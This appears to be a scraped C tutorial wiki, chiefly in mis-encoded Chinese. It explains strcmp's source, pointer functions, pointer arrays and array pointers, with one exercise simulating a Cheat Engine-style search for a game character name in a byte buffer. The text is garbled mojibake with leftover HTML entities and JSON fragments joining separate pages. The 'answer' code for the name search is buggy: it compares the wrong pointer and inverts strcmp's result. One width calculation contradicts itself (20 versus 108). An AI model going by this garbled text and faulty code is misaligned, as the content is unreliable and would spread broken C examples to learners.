å¦‚æœç›¸å‡çš„ç»“æœä¸ä¸º0ï¼Œä¸¤ä¸ªå­—ç¬¦å°±æ˜¯ä¸ç›¸åŒçš„ã€‚ å¦å¤–ï¼Œå†åŠ ä¸ŠæŸä¸ªä¸²æ˜¯å¦åˆ°ç»“å°¾çš„åˆ¤æ–­ã€‚ å¦‚æœä¸¤å­—ç¬¦ç›¸åŒï¼Œä¸”æ²¡åˆ°ç»“å°¾ï¼Œåˆ™ä¸¤æŒ‡é’ˆ++ï¼Œç»§ç»­æ¯”è¾ƒä¸‹ä¸€ä¸ªå­—ç¬¦ã€‚ 1234 *s1=*s2ç­‰ä»·äº *s1-*s2==0 ret=*s1-*s2 //ç”¨ä¸€ä¸ªå˜é‡æ¥å­˜ç›¸å‡çš„ç»“æœ ä¸Šé¢çš„æ€è·¯ä¹Ÿå°±æ˜¯åº“æºç ä¸­çš„å†™æ³• 12while( ! (ret = *(unsigned char *)src - *(unsigned char *)dst) &amp;&amp; *dst) ++src, ++dst; è¿™æ˜¯ä¸€ä¸ªwhileå¾ªç¯ï¼Œå®ƒä¼šä¸€ç›´æ‰§è¡Œï¼Œç›´åˆ°å­—ç¬¦ä¸²ä¸ç›¸ç­‰æˆ–è€…åˆ°è¾¾å­—ç¬¦ä¸²dstçš„ç»“å°¾ï¼ˆå³*dstä¸ºâ€™\\0â€™ï¼Œå­—ç¬¦ä¸²çš„ç»“æŸæ ‡å¿—ï¼‰ã€‚è®©æˆ‘ä»¬é€æ­¥åˆ†æè¿™ä¸€é•¿ä¸²çš„ä»£ç ï¼š è®¡ç®—retçš„å€¼ï¼Œretçš„å€¼ä¸ºä¸¤ä¸ªå­—ç¬¦çš„å·®å€¼ã€‚å…·ä½“åšæ³•ï¼šä¸ºä»€ä¹ˆè¦è½¬æˆunsigned char *ä¸ªäººç†è§£ï¼šè¿™ä»½æºç æ—¶å¾®è½¯å®ç°çš„ï¼Œå®ƒè¦è€ƒè™‘å…¨çƒä¸åŒè¯­è¨€ä¹ æƒ¯çš„ä½¿ç”¨åœºæ™¯ã€‚è€Œæˆ‘ä¸€èˆ¬éƒ½æ˜¯ä»é”®ç›˜ä¸Šè¾“å…¥ä¸€äº›å­—ç¬¦æ¥æµ‹ï¼Œéƒ½åœ¨ASCIIè¡¨çš„[0-127]ï¼Œå¾ˆéš¾ç”¨åˆ°[128,255]æ‹“å±•ASCIIè¡¨çš„å­—ç¬¦ã€‚ä½†å¦‚æœæ˜¯å…¶ä»–å›½å®¶ä¸åŒè¯­è¨€çš„äººï¼Œä»–ä»¬å¯èƒ½ç”¨ä¼šåˆ°[128,255]çš„å­—ç¬¦ã€‚æŒ‰æˆ‘ä»¬ä¹‹å‰çš„æƒ³æ³•ï¼Œä¸¤å­—ç¬¦ç›¸æ¯”ï¼ŒASCIIå€¼è¾ƒå¤§çš„å­—ç¬¦å¤§ã€‚ç”±äºcharç±»å‹æ˜¯æœ‰ç¬¦å·æ•°å­—ï¼Œâ€˜128â€™è¡¨ç¤ºçš„å­—ç¬¦å–å‡ºæ¥å´æ˜¯è´Ÿæ•°ï¼Œæ¯”å­—ç¬¦â€™Aâ€™(ASCIIå€¼æ˜¯65)å°ï¼Œè¿™å°±ä¸å¯¹äº†ï¼Œåº”è¯¥æ˜¯128&gt;65æ‰å¯¹ã€‚æ‰€ä»¥è¦ä»¥(unsigned char *)çš„æ–¹å¼å–å‡ºï¼Œæ”¹å˜æ•°æ®çš„è§£é‡Šæ–¹å¼ï¼Œéƒ½è§£é‡Šä¸ºæ— ç¬¦å·æ•°ã€‚ç¡®ä¿strcmpå‡½æ•°çš„è¡Œä¸ºä¸æˆ‘ä»¬ä»¥å­—ç¬¦åè¿›åˆ¶å¤§å°ä½œä¸ºæ¯”è¾ƒä¾æ®çš„æ ‡å‡†ä¸€è‡´ã€‚ å¯¹srcå’Œdstå¼ºè½¬ï¼Œç”¨unsigned charçš„æ–¹å¼æ¥åˆ†åˆ«å–å‡ºsrcå’ŒdstæŒ‡é’ˆæŒ‡å‘çš„å­—ç¬¦ï¼Œç„¶åç›¸å‡ï¼Œ è®¡ç®—!retçš„å€¼ï¼Œè¿™å°†æ˜¯ä¸€ä¸ªå¸ƒå°”å€¼ï¼ŒçœŸæˆ–å‡ã€‚ è¡¨è¾¾å¼ 1!ret &amp;&amp; *dst å¦‚æœ!retä¸ºçœŸï¼ˆå³retä¸º0ï¼Œä¸¤ä¸ªå­—ç¬¦ç›¸ç­‰ï¼‰ï¼Œå¹¶ä¸”*dstä¸æ˜¯å­—ç¬¦ä¸²çš„ç»“å°¾ï¼Œé‚£ä¹ˆsrcå’ŒdstæŒ‡é’ˆéƒ½ä¼šå‘å‰ç§»åŠ¨ä¸€ä¸ªå­—ç¬¦ï¼ˆ++src, ++dstï¼‰ï¼Œç»§ç»­æ¯”è¾ƒä¸‹ä¸€å¯¹å­—ç¬¦ã€‚ å¦‚æœ!retä¸ºçœŸï¼ˆå³retä¸º0ï¼Œä¸¤ä¸ªå­—ç¬¦ç›¸ç­‰ï¼‰ï¼Œä½†æ˜¯*dstæ˜¯å­—ç¬¦ä¸²çš„ç»“å°¾ï¼Œwhileæ¡ä»¶ä¸ºå‡ï¼Œé€€å‡ºå¾ªç¯ã€‚ å¦‚æœ!retä¸ºå‡ï¼ˆå³retä¸ä¸º0ï¼Œä¸¤ä¸ªå­—ç¬¦ä¸ç›¸ç­‰ï¼‰ï¼Œè¡¨è¾¾å¼çŸ­è·¯ï¼Œä¸æ£€æŸ¥*dstï¼Œwhileæ¡ä»¶ä¸ºå‡ï¼Œé€€å‡ºå¾ªç¯ã€‚ å½“å¾ªç¯ç»“æŸæ—¶ï¼Œå¦‚æœretä¸º0ï¼Œè¯´æ˜ä¸¤ä¸ªå­—ç¬¦ä¸²å®Œå…¨ç›¸åŒã€‚ å½“å¾ªç¯ç»“æŸæ—¶ï¼Œå¦‚æœretä¸ä¸º0ï¼Œè¯´æ˜ä¸¤ä¸ªå­—ç¬¦ä¸²åœ¨æŸä¸ªä½ç½®ä¸Šä¸ç›¸ç­‰ã€‚æ­¤æ—¶ï¼Œ å¦‚æœretå°äº0ï¼Œè¯´æ˜srcæŒ‡å‘çš„å­—ç¬¦åœ¨å­—å…¸åºä¸Šå°äºdstæŒ‡å‘çš„å­—ç¬¦ï¼Œå‡½æ•°å°†è¿”å›-1ï¼› å¦‚æœretå¤§äº0ï¼Œè¯´æ˜srcæŒ‡å‘çš„å­—ç¬¦åœ¨å­—å…¸åºä¸Šå¤§äºdstæŒ‡å‘çš„å­—ç¬¦ï¼Œå‡½æ•°å°†è¿”å›1ã€‚ 1234if ( ret &lt; 0 ) ret = -1 ;else if ( ret &gt; 0 ) ret = 1 ; 1return( ret ); æŒ‡é’ˆå‡½æ•° æŒ‡é’ˆæ˜¯ä¸€ç§ç±»å‹ã€‚ æŒ‡é’ˆå‡½æ•°ï¼šæ˜¯ä¸€ä¸ªå‡½æ•°ï¼Œè¿”å›ç±»å‹ä¸ºæŒ‡é’ˆ å¦‚ï¼š 12char* strcpy(char* dest, char* src);char* strcat(char* dest, char* src); æ¨¡æ‹ŸCEæœç´¢å­—ç¬¦ä¸²çš„åŠŸèƒ½ è¿™ä¸€å †æ•°æ®ä¸­å­˜å‚¨äº†è§’è‰²çš„åå­—ä¿¡æ¯(WOW)ï¼ˆ0x57,0x4F,0x57ï¼‰ï¼Œç¼–å†™å‡½æ•°ï¼Œè¿”å›è§’è‰²åå­—ä¿¡æ¯çš„åœ°å€ï¼Œå¦‚æœåˆ™æ²¡æœ‰è¿”å›0 1char* FindRoleNameAddr(char* pData,char* pRoleName) 123456789100x00,0x01,0x02,0x03,0x04,0x05,0x06,0x07,0x07,0x09, 0x00,0x20,0x10,0x03,0x03,0x0C,0x00,0x00,0x44,0x00, 0x00,0x33,0x00,0x47,0x0C,0x0E,0x00,0x0D,0x00,0x11, 0x00,0x00,0x00,0x02,0x64,0x00,0x00,0x00,0xAA,0x00, 0x00,0x00,0x64,0x10,0x00,0x00,0x00,0x00,0x00,0x00, 0x00,0x00,0x02,0x00,0x74,0x0F,0x41,0x00,0x00,0x00, 0x01,0x00,0x00,0x00,0x05,0x00,0x00,0x00,0x0A,0x00, 0x00,0x02,0x57,0x4F,0x57,0x00,0x06,0x08,0x00,0x00, 0x00,0x00,0x00,0x64,0x00,0x0F,0x00,0x00,0x0D,0x00,0x00,0x00,0x23,0x00,0x00,0x64,0x00,0x00,0x64,0x00 ç­”æ¡ˆ1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465#include &quot;stdafx.h&quot;#include &lt;string.h&gt;char* FindRoleNameAddr(char* pData, char* pRoleName) &#123; if (pData == NULL || pRoleName == NULL) &#123; return 0; &#125; // è®¡ç®—è§’è‰²åå­—çš„é•¿åº¦ size_t roleNameLength = strlen(pRoleName); // å¦‚æœè§’è‰²åå­—é•¿åº¦ä¸º0ï¼Œç›´æ¥è¿”å›0 if (roleNameLength == 0) &#123; return 0; &#125; // éå†æ•°æ®å—ï¼Œå¯»æ‰¾åŒ¹é…çš„è§’è‰²åå­— char* p = pData; for(int i=0;i&lt;=100-roleNameLength;i++) &#123; if (strcmp(pData,pRoleName)) &#123; // æ‰¾åˆ°åŒ¹é…çš„è§’è‰²åå­—ï¼Œè¿”å›å…¶åœ°å€ return p; &#125; ++p; &#125; // æ²¡æœ‰æ‰¾åˆ°åŒ¹é…çš„è§’è‰²åå­—ï¼Œè¿”å›0 return 0;&#125;int main() &#123; // ç¤ºä¾‹æ•°æ® char data[] = &#123; 0x00,0x01,0x02,0x03,0x04,0x05,0x06,0x07,0x07,0x09, 0x00,0x20,0x10,0x03,0x03,0x0C,0x00,0x00,0x44,0x00, 0x00,0x33,0x00,0x47,0x0C,0x0E,0x00,0x0D,0x00,0x11, 0x00,0x00,0x00,0x02,0x64,0x00,0x00,0x00,0xAA,0x00, 0x00,0x00,0x64,0x10,0x00,0x00,0x00,0x00,0x00,0x00, 0x00,0x00,0x02,0x00,0x74,0x0F,0x41,0x00,0x00,0x00, 0x01,0x00,0x00,0x00,0x05,0x00,0x00,0x00,0x0A,0x00, 0x00,0x02,0x57,0x4F,0x57,0x00,0x06,0x08,0x00,0x00, 0x00,0x00,0x00,0x64,0x00,0x0F,0x00,0x00,0x0D,0x00, 0x00,0x00,0x23,0x00,0x00,0x64,0x00,0x00,0x64,0x00 &#125;; // è§’è‰²åå­—&quot;WOW&quot; char roleName[] = &quot;WOW&quot;; // æŸ¥æ‰¾è§’è‰²åå­— char* roleNameAddr = FindRoleNameAddr(data, roleName); if (roleNameAddr != 0) &#123; printf(&quot;æ‰¾åˆ°è§’è‰²åå­—çš„åœ°å€: %p &quot;, (void*)roleNameAddr); &#125; else &#123; printf(&quot;æ²¡æœ‰æ‰¾åˆ°è§’è‰²åå­— &quot;); &#125; return 0;&#125;"},{"title":"æŒ‡é’ˆæ•°ç»„","path":"/wiki/C/æŒ‡é’ˆæ•°ç»„.html","content":"æŒ‡é’ˆæ•°ç»„ æ•°ç»„ï¼šåœ¨å†…å­˜ä¸­è¿ç»­å­˜å‚¨ä¸€ç»„ç›¸åŒæ•°æ®ç±»å‹çš„å˜é‡ã€‚ æŒ‡é’ˆä¹Ÿæ˜¯ä¸€ç§æ•°æ®ç±»å‹ï¼Œé‚£ä¹ˆï¼Œæˆå‘˜æ˜¯æŒ‡é’ˆæ•°æ®ç±»å‹çš„æ•°ç»„å°±æ˜¯æŒ‡é’ˆæ•°ç»„ æŒ‡é’ˆæ•°ç»„ï¼šæ•°ç»„ï¼Œæˆå‘˜æ˜¯æŒ‡é’ˆæ•°æ®ç±»å‹ å£°æ˜ 12345char arr[10]; //æ•°ç»„ï¼Œæœ‰10ä¸ªæˆå‘˜ï¼Œæ¯ä¸ªæˆå‘˜æ˜¯charç±»å‹ï¼Œæ¯ä¸ªæˆå‘˜çš„å®½åº¦ä¸º1char* arr[10]; //æ•°ç»„ï¼Œæœ‰10ä¸ªæˆå‘˜ï¼Œæ¯ä¸ªæˆå‘˜æ˜¯char*ç±»å‹ï¼Œæ¯ä¸ªæˆå‘˜çš„å®½åº¦ä¸º4Point* arr[10]; //æ•°ç»„ï¼Œæœ‰10ä¸ªæˆå‘˜ï¼Œæ¯ä¸ªæˆå‘˜æ˜¯Point*ç±»å‹ï¼Œæ¯ä¸ªæˆå‘˜çš„å®½åº¦ä¸ºsizeof(Point)int******** arr[10]; //æ•°ç»„ï¼Œæœ‰10ä¸ªæˆå‘˜ï¼Œæ¯ä¸ªæˆå‘˜æ˜¯int********ç±»å‹ï¼Œæ¯ä¸ªæˆå‘˜çš„å®½åº¦ä¸º4 èµ‹å€¼ char*æ•°ç»„ä¾‹å­int*æ•°ç»„ä¾‹å­12345// æ–¹å¼ä¸€char* a = &quot;Hello&quot;;char* b = &quot;World&quot;;char* arr[2] = &#123;a, b&#125;; 1234567// æ–¹å¼äºŒchar* a = &quot;Hello&quot;;char* b = &quot;World&quot;;char* arr1[2];arr1[0] = a;arr1[1] = b; 1234// æ–¹å¼ä¸‰char* arr2[2] = &#123;&quot;Hello&quot;, &quot;World&quot;&#125;; //ç¬¬ä¸€ä¸ªæˆå‘˜å­˜&quot;Hello&quot;çš„åœ°å€ //ç¬¬äºŒä¸ªæˆå‘˜å­˜&quot;World&quot;çš„åœ°å€ //&quot;Hello&quot;å’Œ&quot;World&quot;åœ¨å¸¸é‡åŒºä¸­12345// æ–¹å¼ä¸€int a = 10;int b = 20;int* arr[2] = &#123;&amp;a, &amp;b&#125;; 1234567// æ–¹å¼äºŒint a = 10;int b = 20;int* arr[2];arr1[0] = &amp;a;arr1[1] = &amp;b; 12// æ–¹å¼ä¸‰int* arr[2] = &#123;(int*)10, (int*)20&#125;; // æ— æ³•intè½¬åˆ°int*ï¼Œå¼ºè½¬ä¸€ä¸‹ åæ±‡ç¼– 1234567int a = 10;int b = 20;int c = 30;int d = 40;int e = 50;int* arr[5] = &#123;&amp;a, &amp;b, &amp;c, &amp;d, &amp;e&#125;; ç»ƒä¹  å»ºä¸€ä¸ªå­—ç¬¦æŒ‡é’ˆæ•°ç»„ï¼Œå­˜å‚¨æ‰€æœ‰çš„Cçš„å…³é”®è¯(æŸ¥èµ„æ–™æ‰¾)ï¼Œå¹¶å…¨éƒ¨æ‰“å°å‡ºæ¥. ç­”æ¡ˆæ‰“å°ä¸€ä¸ªå­—ç¬¦æŒ‡é’ˆçš„ä¼šå†™æŠŠï¼š1234567891011#include &quot;stdafx.h&quot;int main()&#123; char* a = &quot;Hello&quot;; printf(&quot;%s &quot;,a); return 0;&#125;ç°åœ¨å˜æˆæ‰“å°æŒ‡é’ˆæ•°ç»„ä¸­çš„æ¯ä¸ªæˆå‘˜ï¼š123456789101112131415161718192021222324#include &lt;stdio.h&gt;int main() &#123; // Cè¯­è¨€çš„å…³é”®è¯ const char *keywords[] = &#123; &quot;auto&quot;, &quot;break&quot;, &quot;case&quot;, &quot;char&quot;, &quot;const&quot;, &quot;continue&quot;, &quot;default&quot;, &quot;do&quot;, &quot;double&quot;, &quot;else&quot;, &quot;enum&quot;, &quot;extern&quot;, &quot;float&quot;, &quot;for&quot;, &quot;goto&quot;, &quot;if&quot;, &quot;inline&quot;, &quot;int&quot;, &quot;long&quot;, &quot;register&quot;, &quot;restrict&quot;, &quot;return&quot;, &quot;short&quot;, &quot;signed&quot;, &quot;sizeof&quot;, &quot;static&quot;, &quot;struct&quot;, &quot;switch&quot;, &quot;typedef&quot;, &quot;union&quot;, &quot;unsigned&quot;, &quot;void&quot;, &quot;volatile&quot;, &quot;while&quot;, &quot;_Alignas&quot;, &quot;_Alignof&quot;, &quot;_Atomic&quot;, &quot;_Bool&quot;, &quot;_Complex&quot;, &quot;_Generic&quot;, &quot;_Imaginary&quot;, &quot;_Noreturn&quot;, &quot;_Static_assert&quot;, &quot;_Thread_local&quot; &#125;; int num_keywords = sizeof(keywords) / sizeof(char*); printf(&quot;C language keywords: &quot;); for (int i = 0; i &lt; num_keywords; i++) &#123; printf(&quot;%s &quot;, keywords[i]); &#125; return 0;&#125; ç»“æ„ä½“æŒ‡é’ˆæ•°ç»„ 12345678struct Point&#123; int x; int y;&#125;;Point p; //å®½åº¦8å­—èŠ‚Point arr[10]; //æ¯ä¸ªæˆå‘˜å®½åº¦ä¸º8ï¼Œå…±8*10å­—èŠ‚Point *arrPoint[10]; //æ¯ä¸ªæˆå‘˜å®½åº¦ä¸º4ï¼Œå…±4*10å­—èŠ‚"},{"title":"æ•°ç»„æŒ‡é’ˆ","path":"/wiki/C/æ•°ç»„æŒ‡é’ˆ.html","content":"å¼• ä¹‹å‰å­¦çš„&amp;å–åœ°å€ç¬¦ï¼Œå¯ç”¨åœ¨å˜é‡ä¸Šå¯¹å˜é‡å–åœ°å€ 1234int arr[] = &#123;1, 2, 3, 4, 5, 6, 7, 8, 9, 0&#125;;int* p = &amp;arr[0]; //å–arræ•°ç»„ç¬¬ä¸€ä¸ªæˆå‘˜çš„åœ°å€int* p1 = arr; //ä¸Šé¢çš„ç®€å†™å½¢å¼ é‚£&amp;arræ˜¯ä»€ä¹ˆï¼Ÿæˆ‘ä»¬ç”¨ä¸€ä¸ªintç±»å‹å˜é‡ä½œä¸ºå·¦å€¼ï¼Œç¼–è¯‘æ¥çœ‹ä¸€ä¸‹ 1int x = &amp;arr; //arrä¹Ÿæ˜¯ä¸€ä¸ªå˜é‡ï¼Œç”¨&amp;å–ï¼Œæ˜¯ä»€ä¹ˆç±»å‹ï¼Ÿ æŠ¥é”™è¯´ï¼šæ— æ³•å°†int (*)[10]ç±»å‹è½¬ä¸ºintç±»å‹ã€‚è¯´æ˜&amp;arræ˜¯int (*)[10]ç±»å‹ã€‚å®é™…ä¸Šè¿™æ˜¯æ•°ç»„æŒ‡é’ˆç±»å‹ã€‚ æ•°ç»„æŒ‡é’ˆï¼šæŒ‡é’ˆï¼Œæ•°æ®ç±»å‹ä¸ºæ•°ç»„çš„æŒ‡é’ˆï¼ŒæŒ‡å‘æ•°ç»„çš„æŒ‡é’ˆã€‚æ—¢ç„¶æ˜¯æŒ‡é’ˆï¼Œå°±æ»¡è¶³æˆ‘ä»¬ä¹‹å‰å­¦çš„æŒ‡é’ˆçš„é‚£äº›ç‰¹å¾ å£°æ˜å’Œèµ‹å€¼ å£°æ˜ (*x)å¯ä»¥æŒ¨ç€intå†™ï¼Œä¹Ÿå¯ä»¥æŒ¨ç€[]å†™ 123int(*px) [5];int (*px)[5]; 1234567891011//ä¸€ç»´æ•°ç»„æŒ‡é’ˆchar(*p1) [3]; //æŒ‡é’ˆå˜é‡åä¸ºp1ï¼Œç±»å‹ä¸ºchar(*) [3]int(*p2) [5]; //æŒ‡é’ˆå˜é‡åä¸ºp2ï¼Œç±»å‹ä¸ºint(*) [5]//äºŒç»´æ•°ç»„æŒ‡é’ˆchar(*p3) [2][2]; //æŒ‡é’ˆå˜é‡åä¸ºp3ï¼Œç±»å‹ä¸ºchar(*) [2][2]int(*p4) [2][2]; //æŒ‡é’ˆå˜é‡åä¸ºp4ï¼Œç±»å‹ä¸ºint(*) [2][2]//ä¸‰ç»´æ•°ç»„æŒ‡é’ˆchar(*p5) [3][3][3]; //æŒ‡é’ˆå˜é‡åä¸ºp5ï¼Œç±»å‹ä¸ºchar(*) [3][3][3]int(*p6) [3][3][3]; //æŒ‡é’ˆå˜é‡åä¸ºp6ï¼Œç±»å‹ä¸ºint(*) [3][3][3] int *p[5]ä¸int (*p)[5]æœ‰ä»€ä¹ˆåŒºåˆ«ï¼Ÿint *p[5]ï¼šæŒ‡é’ˆæ•°ç»„[]çš„ä¼˜å…ˆçº§é«˜äº*ï¼Œæ‰€ä»¥å…ˆå’Œpç»„åˆæˆp[5]æ•°ç»„ï¼Œå†ç”±int *è¯´æ˜æ•°ç»„çš„æˆå‘˜çš„æ•°æ®ç±»å‹ï¼Œè¿™ç§å†™æ³•å¯èƒ½æ¸…æ™°äº›ï¼šint* p[5]int (*p)[5]ï¼šæ•°ç»„æŒ‡é’ˆ()çš„ä¼˜å…ˆçº§é«˜äº[]ï¼Œæ‰€ä»¥*å…ˆå’Œpç»“åˆæˆæŒ‡é’ˆï¼Œå†ç”±int[5]è¯´æ˜æŒ‡é’ˆçš„ç±»å‹æ˜¯æŒ‡å‘ä¸€ä¸ªè¿ç»­åŒ…å«5ä¸ªintçš„å†…å­˜åŒºåŸŸï¼ˆå³æ•°ç»„ï¼‰ èµ‹å€¼ è¦ä¿è¯ç±»å‹ä¸€è‡´ï¼Œå®Œæ•´å†™æ³•ã€‚ 1234 int(*p2) [5]; //æŒ‡é’ˆç±»å‹ä¸ºint(*) [5] p2=(int(*) [5])1; //å¯¹1å¼ºè½¬ä¸ºint(*) [5]ç±»å‹ç„¶åèµ‹ç»™p2 //p2=(int* [5])1; //åˆ«å†™é”™äº† ç‰¹å¾æ¢æµ‹ å®½åº¦ æŒ‡é’ˆç±»å‹å˜é‡çš„å®½åº¦æ°¸è¿œæ˜¯4å­—èŠ‚ï¼Œæ— è®ºæ˜¯ä»€ä¹ˆç±»å‹çš„æŒ‡é’ˆã€‚ç”¨sizeofæ¢æµ‹æ•°ç»„æŒ‡é’ˆçš„å®½åº¦ï¼Œè¾“å‡ºç»“æœä¸º4ï¼Œå’Œä¹‹å‰å­¦çš„ä¸€æ ·ã€‚ è¿ç®— 12345678910111213141516171819202122232425262728293031323334353637383940414243#include &quot;stdafx.h&quot;int main()&#123; //ä¸€ç»´æ•°ç»„æŒ‡é’ˆ char(*p1) [3]; int(*p2) [5]; //äºŒç»´æ•°ç»„æŒ‡é’ˆ char(*p3) [2][2]; int(*p4) [2][2]; //ä¸‰ç»´æ•°ç»„æŒ‡é’ˆ char(*p5) [3][3][3]; int(*p6) [3][3][3]; //ç»™è¿™äº›æŒ‡é’ˆéƒ½èµ‹å€¼ä¸º1 p1=(char(*) [3])1; p2=(int(*) [5])1; p3=(char(*) [2][2])1; p4=(int(*) [2][2])1; p5=(char(*) [3][3][3])1; p6=(int(*) [3][3][3])1; //éƒ½++ï¼Œç„¶åæ‰“å°è¾“å‡ºè§‚å¯Ÿ+äº†å¤šå°‘ p1++; p2++; p3++; p4++; p5++; p6++; // æ‰“å°ä¸€ç»´æ•°ç»„æŒ‡é’ˆ++åçš„ç»“æœ printf(&quot;%d %d &quot;, p1, p2); // æ‰“å°äºŒç»´æ•°ç»„æŒ‡é’ˆ++åçš„ç»“æœ printf(&quot;%d %d &quot;, p3, p4); // æ‰“å°ä¸‰ç»´æ•°ç»„æŒ‡é’ˆ++åçš„ç»“æœ printf(&quot;%d %d &quot;, p5, p6); return 0;&#125; æŒ‰ä¹‹å‰å­¦çš„ï¼ŒæŒ‡é’ˆ++ï¼Œå¢åŠ çš„æ•°é‡æ˜¯å»æ‰ä¸€ä¸ª*åå˜é‡çš„å®½åº¦ ä¸€ç»´æ•°ç»„æŒ‡é’ˆäºŒç»´æ•°ç»„æŒ‡é’ˆä¸‰ç»´æ•°ç»„æŒ‡é’ˆå¯¹äºæŒ‡é’ˆp1ï¼ŒæŒ‡é’ˆç±»å‹æ˜¯(char* [3])ï¼Œå»æ‰ä¸€ä¸ª*åæ˜¯char [3]ï¼ˆcharç±»å‹ï¼Œ3ä¸ªï¼‰ï¼Œå®½åº¦æ˜¯sizeof(char)Ã—3=3ï¼Œå¢åŠ 3ã€‚1+3=4ï¼› å¯¹äºæŒ‡é’ˆp2ï¼ŒæŒ‡é’ˆç±»å‹æ˜¯(int* [5])ï¼Œå»æ‰ä¸€ä¸ª*åæ˜¯int [5]ï¼ˆintç±»å‹ï¼Œ5ä¸ªï¼‰ï¼Œå®½åº¦æ˜¯sizeof(int)Ã—5=20ï¼Œå¢åŠ 20ã€‚1+20=21ã€‚å¯¹äºæŒ‡é’ˆp3ï¼ŒæŒ‡é’ˆç±»å‹æ˜¯(char* [2][2])ï¼Œå»æ‰ä¸€ä¸ª*åæ˜¯char [2][2]ï¼ˆcharç±»å‹ï¼Œ2Ã—2ä¸ªï¼‰ï¼Œå®½åº¦æ˜¯sizeof(char)Ã—2Ã—2=4ï¼Œå¢åŠ 4ã€‚1+4=5ï¼› å¯¹äºæŒ‡é’ˆp4ï¼ŒæŒ‡é’ˆç±»å‹æ˜¯(int* [2][2])ï¼Œå»æ‰ä¸€ä¸ª*åæ˜¯int [2][2])ï¼ˆintç±»å‹ï¼Œ2Ã—2ä¸ªï¼‰ï¼Œå®½åº¦æ˜¯sizeof(int)Ã—2Ã—2==16ï¼Œå¢åŠ 16ã€‚1+16=17ã€‚å¯¹äºæŒ‡é’ˆp5ï¼ŒæŒ‡é’ˆç±»å‹æ˜¯(char* [3][3][3])ï¼Œå»æ‰ä¸€ä¸ª*åæ˜¯char [3][3][3]ï¼ˆcharç±»å‹ï¼Œ3Ã—3Ã—3ä¸ªï¼‰ï¼Œå®½åº¦æ˜¯sizeof(char)Ã—3Ã—3Ã—3=27ï¼Œå¢åŠ 27ã€‚1+27=28ï¼› å¯¹äºæŒ‡é’ˆp6ï¼ŒæŒ‡é’ˆç±»å‹æ˜¯(int* [3][3][3])ï¼Œå»æ‰ä¸€ä¸ª*åæ˜¯int [3][3][3]ï¼ˆintç±»å‹ï¼Œ3Ã—3Ã—3ä¸ªï¼‰ï¼Œå®½åº¦æ˜¯sizeof(int)Ã—3Ã—3Ã—3=20ï¼Œå¢åŠ 108ã€‚1+108=109ã€‚ ++ï¼Œâ€“ï¼Œ+Nï¼Œ-Nï¼ŒåŒç†ï¼Œè¿™é‡Œç•¥ ä½¿ç”¨æ•°ç»„æŒ‡é’ˆ 12int arr[] = &#123;1, 2, 3, 4, 5, 6, 7, 8, 9, 0&#125;;int(*px)[10] = &amp;arr; *pxæ˜¯ä»€ä¹ˆï¼ŸæŒ‰ä¹‹å‰å­¦çš„ï¼Œï¼ˆ*+æŒ‡é’ˆç±»å‹è¡¨è¾¾å¼ï¼‰çš„ç±»å‹ï¼Œæ˜¯å˜é‡å½“å‰çš„ç±»å‹å‡å»ä¸€ä¸ª*å·ã€‚int(*) [10]æ•°ç»„æŒ‡é’ˆç±»å‹å»æ‰ä¸€ä¸ª*åæ˜¯int [10]ï¼Œé‚£ä¹ˆ*pxå°±æ˜¯ä¸€ä¸ªæ•°ç»„ã€‚ç„¶åæˆ‘ä»¬å–è¿™ä¸ªæ•°ç»„ä¸­çš„ç¬¬ä¸€ä¸ªæˆå‘˜ï¼Œå°±æ˜¯è¿™æ ·å†™(*px)[0]ã€‚ 1printf(&quot;%d &quot;, (*px)[0]); æ­¤å¤–ï¼ŒæŒ‰å‰è¾¹å­¦çš„æŒ‡é’ˆå–å€¼çš„ä¸¤ç§æ–¹å¼ï¼Œ*(p+i) = p[i]ã€‚äºæ˜¯è¿˜æœ‰ä¸‹é¢ä¸¤ç§å†™æ³•ï¼š 123//å°†(*px)[0]ä¸­çš„(*px)æ›¿æ¢ä¸ºç­‰ä»·å†™æ³•ï¼Œ(*px)=*(px+0)=px[0]//(*px)[0]å°±å˜æˆäº†px[0][0]printf(&quot;%d &quot;, px[0][0]); 12345678910// å°†(*px)[0]ä¸­çš„(*px)è¿™ä¸€ä¸ªæ•´ä½“çœ‹æˆpxï¼Œä»£å…¥(*px)=*(px+0)=px[0]// ä»¤y=(*px)// é‚£ä¹ˆ(*px)[0]=y[0]=*(y+0)// æ¢å¤y//*((*px)+0)// æ ¹æ®(*px)=*(px+0)ï¼Œå†™å…¨//*(*(px+0)+0)// ç»¼ä¸Šï¼Œ(*px)[0]å°±å˜æˆäº†*(*(px+0)+0)printf(&quot;%d &quot;, *(*(px + 0) + 0)); å…³äºpxå’Œ*px123456789101112#include &quot;stdafx.h&quot;int main()&#123; int arr[] = &#123;1, 2, 3, 4, 5, 6, 7, 8, 9, 0&#125;; int(*px)[10] = &amp;arr; printf(&quot;%d %d &quot;, px, *px); printf(&quot;%d %d &quot;, px + 1, (*px) + 1); return 0;&#125;pxæ˜¯int (*)[10]ç±»å‹ï¼Œ*pxæ˜¯int [10]æ•°ç»„ç±»å‹è™½ç„¶å®ƒä¿©å­˜çš„å€¼ä¸€æ ·ï¼Œä½†åœ¨è¿ç®—æ—¶ï¼Œæ¯”å¦‚++ï¼Œâ€“ï¼Œ+Nï¼Œ-Næ˜¯æ ¹æ®å®ƒçš„ç±»å‹è¿›è¡Œçš„æ¯”å¦‚ï¼Œä¸Šé¢çš„ä»£ç px+1ï¼Œæ˜¯+1Ã—4Ã—10(*px)+1ï¼Œæ˜¯+1Ã—4 ä¸ºäº†æ–¹ä¾¿æµ‹è¯•ï¼Œæˆ‘ä»¬åˆ›å»ºä¸€ä¸ªäºŒç»´æ•°ç»„æ¥ç€è¯•ã€‚ä½†åœ¨å®é™…æƒ…å†µä¸­ï¼Œæ•°ç»„æŒ‡é’ˆå¯ä»¥æŒ‡å‘ä»»ä½•åœ°æ–¹ï¼Œä¸ä¸€å®šè¦æŒ‡å‘æ•°ç»„ï¼Œå®ƒä»¬ä¹‹é—´æ²¡æœ‰ä»»ä½•è”ç³»ã€‚ 12345678910int arr[3][3] = &#123; &#123;1,2,3&#125;, &#123;4,5,6&#125;, &#123;7,8,9&#125;&#125;;//ç¬¬ä¸€ä¸ªæˆå‘˜æ˜¯arr[0]ï¼Œarr[0]æ˜¯&#123;1,2,3&#125;ä¸€ä¸ªä¸€ç»´æ•°ç»„//å–å®ƒçš„åœ°å€ï¼Œ&amp;arr[0]ï¼Œåœ¨åŸæ¥çš„ç±»å‹ä¸ŠåŠ ä¸€ä¸ª*ï¼Œè¡¨è¾¾å¼ç±»å‹æ˜¯ä¸€ç»´æ•°ç»„æŒ‡é’ˆint(*px)[3] = &amp;arr[0]; 